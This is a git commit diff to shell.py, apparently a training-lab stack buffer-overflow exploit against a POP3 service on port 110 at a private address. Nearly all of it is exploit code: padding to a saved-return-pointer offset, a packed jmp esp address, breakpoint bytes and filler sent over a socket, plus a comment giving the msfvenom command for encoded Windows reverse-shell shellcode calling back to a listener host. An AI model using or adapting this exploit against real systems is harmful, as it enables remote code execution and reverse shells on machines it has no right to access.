2f43515d45d01fb0921fc570d6001130945616a9
Mitch Lacy <mrlacy@uwm.edu>
2018-08-28 18:45:02 -0700

    Update shell.py

--- shell.py
+++ shell.py
@@ -1,12 +1,12 @@
 #!/usr/bin/env python  
-import socket  
+import socket
+import struct
 RHOST = "10.11.12.36"
 RPORT = 110 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 s.connect((RHOST, RPORT))
-s.recv(1024)
- 
+
 buf_totlen = 2700 #get this from fuzzing
 offset_srp = 2606 #get this from pattern_offset
 
@@ -17,9 +17,6 @@ buf += 'A'*(offset_srp-len(buf))
 buf += struct.pack("<I", ptr_jmp_esp)
 buf += "\xCC\xCC\xCC\xCC"
 buf += "D"*(buf_totlen-len(buf))
-
-s.send('USER username' +'\r\n')
-s.recv(1024)  
-s.send('PASS ' + buf + '\r\n') 
+s.send(buf + '\n') 
 
 #get shellcode (goes before the D's) from msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d
